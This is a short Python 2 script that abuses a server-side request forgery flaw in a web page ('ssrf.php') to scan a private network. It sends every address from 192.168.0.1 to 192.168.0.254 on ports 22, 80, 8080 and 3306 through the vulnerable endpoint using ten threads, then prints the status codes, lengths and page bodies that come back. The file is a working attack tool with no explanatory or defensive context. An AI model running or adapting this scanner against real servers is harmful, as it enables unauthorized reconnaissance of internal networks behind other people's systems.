#coding:utf-8
import urllib,urllib2
import threading,Queue,time



q = Queue.Queue()
lock = threading.Lock()
def get_server(url,data=None):
    code=html=length=""
    data ={'url':'http://'+data}
    values= urllib.urlencode(data)
    try:
        
        req=urllib2.urlopen(url, data=values, timeout=5)
        html=req.read()
        code =req.code
        length=len(html)
        return code,html,length
    except:
        return code,html,length

#print get_server("http://localhost/ssrf/ssrf.php", "127.0.0.1:3306")



def run():
    while q.qsize()>0:
        ip = q.get()
        code,html,length=get_server("http://www.webtester.com/ssrf.php",ip)
        time.sleep(0.01)
        if length!="":
            lock.acquire()
            print "http://"+ip+"    code     "+str(code)+"    length    "+str(length)+"    html    "+html
            lock.release()
        else:
            lock.acquire()
            print ip
            lock.release()
            
            
    q.all_tasks_done
    
    



ip="192.168.0."
for i in range(1,255):
    for port in [22,80,8080,3306]:
        iport = ip+str(i)+":"+str(port)
        q.put(iport)



for i in range(10):
    t = threading.Thread(target=run)
    t.start()
q.join()